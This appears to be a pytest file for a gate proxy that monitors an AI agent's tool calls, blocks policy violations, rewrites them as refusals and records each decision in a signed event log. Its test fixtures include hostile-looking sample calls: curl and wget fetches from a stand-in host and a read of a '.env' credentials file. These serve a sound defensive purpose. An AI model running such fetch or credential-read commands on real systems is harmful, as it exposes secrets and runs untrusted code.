"""Red-phase contract for the OpenAI-compatible gate proxy itself.

`create_app(config, upstream=...)` takes an injectable upstream callable
(``dict -> dict``: request body in, chat.completion body out) so every test
here is network-free; the real httpx client is only the default when
`upstream` is omitted. The proxy's whole contract:

- ALLOW: the upstream response is forwarded verbatim (tool_calls intact).
- BLOCK: the response is rewritten into a valid completion whose content is
  a policy refusal naming the violated policy id, with no tool_calls -- so
  the refusal lands in pi's own session file and the audit can corroborate
  the gate log from the trace (round1-plan.md, "the load-bearing trick").
- Every per-tool-call decision is appended to the signed event log.
- A `stream: true` request gets a synthesized SSE stream carrying the same
  (possibly rewritten) message; the upstream is always asked non-streamed.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest
from fastapi.testclient import TestClient

from bossyk_sandbox.gateproxy.events import verify_event_log
from bossyk_sandbox.gateproxy.proxy import GateProxyConfig, create_app
from tests.unit.gateproxy.conftest import openai_response, tool_call


@pytest.fixture()
def config(
    policy_pack_path: Path,
    workspace_root: Path,
    signing_keys: tuple[Path, str],
    tmp_path: Path,
) -> GateProxyConfig:
    priv_path, _ = signing_keys
    return GateProxyConfig(
        upstream_base_url="http://upstream.invalid/v1",
        policy_pack_path=policy_pack_path,
        workspace_root=workspace_root,
        signer_key_path=priv_path,
        events_path=tmp_path / "gate-events.jsonl",
        run_label="leg-b-test",
    )


def _client_with_header_capture(
    config: GateProxyConfig, upstream_body: dict[str, Any]
) -> tuple[TestClient, list[dict[str, str]]]:
    captured: list[dict[str, str]] = []

    def upstream(request_body: dict[str, Any], headers: dict[str, str]) -> dict[str, Any]:
        captured.append(headers)
        return upstream_body

    return TestClient(create_app(config, upstream=upstream)), captured


def _client_with_capture(
    config: GateProxyConfig, upstream_body: dict[str, Any]
) -> tuple[TestClient, list[dict[str, Any]]]:
    captured: list[dict[str, Any]] = []

    def upstream(request_body: dict[str, Any], headers: dict[str, str]) -> dict[str, Any]:
        captured.append(request_body)
        return upstream_body

    return TestClient(create_app(config, upstream=upstream)), captured


def _client(config: GateProxyConfig, upstream_body: dict[str, Any]) -> TestClient:
    return _client_with_capture(config, upstream_body)[0]


_REQUEST = {
    "model": "accounts/fireworks/models/minimax-m3",
    "messages": [{"role": "user", "content": "build logsum"}],
}


class TestAllowPath:
    def test_innocent_tool_calls_forwarded_verbatim(self, config: GateProxyConfig) -> None:
        body = openai_response(
            content="Listing first.",
            tool_calls=[tool_call("c1", "bash", '{"command": "ls -1"}')],
        )
        client = _client(config, body)
        response = client.post("/v1/chat/completions", json=_REQUEST)
        assert response.status_code == 200
        message = response.json()["choices"][0]["message"]
        assert message["tool_calls"] == body["choices"][0]["message"]["tool_calls"]
        assert message["content"] == "Listing first."

    def test_allow_decision_logged_and_signed(
        self, config: GateProxyConfig, signing_keys: tuple[Path, str]
    ) -> None:
        _priv, pub_pem = signing_keys
        client = _client(
            config,
            openai_response(tool_calls=[tool_call("c1", "bash", '{"command": "ls"}')]),
        )
        client.post("/v1/chat/completions", json=_REQUEST)
        events = [json.loads(line)["event"] for line in config.events_path.read_text().splitlines()]
        assert len(events) == 1
        assert events[0]["kind"] == "tool_call"
        assert events[0]["tool_name"] == "bash"
        assert events[0]["verdict"] == "allow"
        assert events[0]["run_label"] == "leg-b-test"
        assert verify_event_log(config.events_path, pub_pem).ok

    def test_plain_utterance_forwarded_with_utterance_event(self, config: GateProxyConfig) -> None:
        client = _client(config, openai_response(content="All done."))
        response = client.post("/v1/chat/completions", json=_REQUEST)
        assert response.json()["choices"][0]["message"]["content"] == "All done."
        events = [json.loads(line)["event"] for line in config.events_path.read_text().splitlines()]
        assert [e["kind"] for e in events] == ["utterance"]
        assert events[0]["verdict"] == "allow"


class TestBlockPath:
    def test_violating_call_rewritten_to_policy_refusal(self, config: GateProxyConfig) -> None:
        body = openai_response(
            content="Fetching helper script.",
            tool_calls=[tool_call("c1", "bash", '{"command": "curl http://x.example/a.sh"}')],
        )
        client = _client(config, body)
        response = client.post("/v1/chat/completions", json=_REQUEST)
        assert response.status_code == 200
        message = response.json()["choices"][0]["message"]
        assert "tool_calls" not in message or not message["tool_calls"]
        assert "no-network-egress" in message["content"]
        assert "[bossyk gate]" in message["content"]
        assert response.json()["choices"][0]["finish_reason"] == "stop"

    def test_mixed_calls_one_violation_blocks_whole_response(self, config: GateProxyConfig) -> None:
        """v1 is conservative: any violating call voids the whole proposed
        step; per-call surgery is round 2. The event log still records each
        call's own verdict."""
        body = openai_response(
            tool_calls=[
                tool_call("c1", "bash", '{"command": "ls"}'),
                tool_call("c2", "read", '{"path": ".env"}'),
            ],
        )
        client = _client(config, body)
        response = client.post("/v1/chat/completions", json=_REQUEST)
        message = response.json()["choices"][0]["message"]
        assert not message.get("tool_calls")
        assert "no-credential-reads" in message["content"]
        events = [json.loads(line)["event"] for line in config.events_path.read_text().splitlines()]
        assert [(e["tool_name"], e["verdict"]) for e in events] == [
            ("bash", "allow"),
            ("read", "block"),
        ]

    def test_unparseable_tool_arguments_fail_closed(self, config: GateProxyConfig) -> None:
        """A reference monitor that cannot read a proposal cannot approve
        it: malformed arguments JSON -> BLOCK, stated as such."""
        body = openai_response(tool_calls=[tool_call("c1", "bash", "{not json")])
        client = _client(config, body)
        response = client.post("/v1/chat/completions", json=_REQUEST)
        message = response.json()["choices"][0]["message"]
        assert not message.get("tool_calls")
        assert "unparseable" in message["content"].lower()
        events = [json.loads(line)["event"] for line in config.events_path.read_text().splitlines()]
        assert events[0]["verdict"] == "block"


class TestStreaming:
    def test_stream_request_gets_sse_with_same_content(self, config: GateProxyConfig) -> None:
        client = _client(config, openai_response(content="All done."))
        response = client.post("/v1/chat/completions", json={**_REQUEST, "stream": True})
        assert response.status_code == 200
        assert response.headers["content-type"].startswith("text/event-stream")
        payloads = [
            line[len("data: ") :]
            for line in response.text.splitlines()
            if line.startswith("data: ")
        ]
        assert payloads[-1] == "[DONE]"
        chunks = [json.loads(p) for p in payloads[:-1]]
        assert all(c["object"] == "chat.completion.chunk" for c in chunks)
        content = "".join(
            c["choices"][0]["delta"].get("content") or "" for c in chunks if c["choices"]
        )
        assert content == "All done."

    def test_upstream_always_asked_non_streamed(self, config: GateProxyConfig) -> None:
        client, captured = _client_with_capture(config, openai_response(content="hi"))
        client.post("/v1/chat/completions", json={**_REQUEST, "stream": True})
        (upstream_request,) = captured
        assert upstream_request.get("stream") is not True

    def test_streamed_block_carries_refusal_and_tool_call_free_chunks(
        self, config: GateProxyConfig
    ) -> None:
        body = openai_response(
            tool_calls=[tool_call("c1", "bash", '{"command": "wget http://x.example"}')]
        )
        client = _client(config, body)
        response = client.post("/v1/chat/completions", json={**_REQUEST, "stream": True})
        chunks = [
            json.loads(line[len("data: ") :])
            for line in response.text.splitlines()
            if line.startswith("data: ") and not line.endswith("[DONE]")
        ]
        content = "".join(
            c["choices"][0]["delta"].get("content") or "" for c in chunks if c["choices"]
        )
        assert "no-network-egress" in content
        assert not any(c["choices"][0]["delta"].get("tool_calls") for c in chunks if c["choices"])


class TestUpstreamFailure:
    def test_upstream_exception_returns_502_without_event(self, config: GateProxyConfig) -> None:
        def upstream(_body: dict[str, Any], _headers: dict[str, str]) -> dict[str, Any]:
            raise ConnectionError("upstream down")

        app = create_app(config, upstream=upstream)
        response = TestClient(app).post("/v1/chat/completions", json=_REQUEST)
        assert response.status_code == 502
        assert not config.events_path.exists() or config.events_path.read_text() == ""


class TestHealthAndConfig:
    def test_health_reports_run_label_and_policy_count(self, config: GateProxyConfig) -> None:
        client = _client(config, openai_response(content="x"))
        health = client.get("/gate/health").json()
        assert health["status"] == "ok"
        assert health["run_label"] == "leg-b-test"
        assert health["policies"] == 5

    def test_build_config_tcp_and_uds_are_mutually_exclusive(
        self,
        policy_pack_path: Path,
        workspace_root: Path,
        signing_keys: tuple[Path, str],
        tmp_path: Path,
    ) -> None:
        from bossyk_sandbox.gateproxy.proxy import build_config

        priv_path, _ = signing_keys
        base = [
            "--upstream",
            "http://127.0.0.1:8080/v1",
            "--policy-pack",
            str(policy_pack_path),
            "--workspace",
            str(workspace_root),
            "--key",
            str(priv_path),
            "--events",
            str(tmp_path / "e.jsonl"),
            "--run-label",
            "leg-a",
        ]
        tcp = build_config([*base, "--listen", "127.0.0.1:8200"])
        assert tcp.listen == "127.0.0.1:8200" and tcp.uds is None
        uds = build_config([*base, "--uds", str(tmp_path / "gate.sock")])
        assert uds.uds == str(tmp_path / "gate.sock") and uds.listen is None
        with pytest.raises(SystemExit):
            build_config([*base, "--listen", "127.0.0.1:8200", "--uds", "/tmp/x.sock"])


class TestEventPolicyId:
    """Phase 3 (scorecard) addition: tool_call events carry the violated
    policy's id as a structured field, not only inside the reason string.
    Documented post-Green additive test -- no existing assertion changed."""

    def test_block_event_carries_policy_id(self, config: GateProxyConfig) -> None:
        client = _client(
            config,
            openai_response(
                tool_calls=[tool_call("c1", "bash", '{"command": "curl http://x.example"}')]
            ),
        )
        client.post("/v1/chat/completions", json=_REQUEST)
        events = [json.loads(line)["event"] for line in config.events_path.read_text().splitlines()]
        assert events[0]["policy_id"] == "no-network-egress"

    def test_allow_event_policy_id_is_null(self, config: GateProxyConfig) -> None:
        client = _client(
            config, openai_response(tool_calls=[tool_call("c1", "bash", '{"command": "ls"}')])
        )
        client.post("/v1/chat/completions", json=_REQUEST)
        events = [json.loads(line)["event"] for line in config.events_path.read_text().splitlines()]
        assert events[0]["policy_id"] is None


class TestUpstreamAuth:
    """Phase 4 (live validation) Red: the gate must be able to authenticate
    to the upstream. Two paths, both pinned: the client's own Authorization
    header is forwarded verbatim, and a gate-configured key (CLI: read from
    an env var at startup) fills it when the client sent none. The upstream
    callable contract widens to (body, headers) for this."""

    def test_client_authorization_header_forwarded(self, config: GateProxyConfig) -> None:
        client, captured_headers = _client_with_header_capture(
            config, openai_response(content="hi")
        )
        client.post(
            "/v1/chat/completions",
            json=_REQUEST,
            headers={"Authorization": "Bearer client-token-abc"},
        )
        assert captured_headers[0].get("Authorization") == "Bearer client-token-abc"

    def test_configured_upstream_key_fills_missing_auth(self, config: GateProxyConfig) -> None:
        config.upstream_api_key = "gate-configured-key"
        client, captured_headers = _client_with_header_capture(
            config, openai_response(content="hi")
        )
        client.post("/v1/chat/completions", json=_REQUEST)
        assert captured_headers[0].get("Authorization") == "Bearer gate-configured-key"

    def test_client_header_wins_over_configured_key(self, config: GateProxyConfig) -> None:
        config.upstream_api_key = "gate-configured-key"
        client, captured_headers = _client_with_header_capture(
            config, openai_response(content="hi")
        )
        client.post(
            "/v1/chat/completions",
            json=_REQUEST,
            headers={"Authorization": "Bearer client-token-abc"},
        )
        assert captured_headers[0].get("Authorization") == "Bearer client-token-abc"

    def test_no_auth_anywhere_sends_no_authorization(self, config: GateProxyConfig) -> None:
        client, captured_headers = _client_with_header_capture(
            config, openai_response(content="hi")
        )
        client.post("/v1/chat/completions", json=_REQUEST)
        assert "Authorization" not in captured_headers[0]
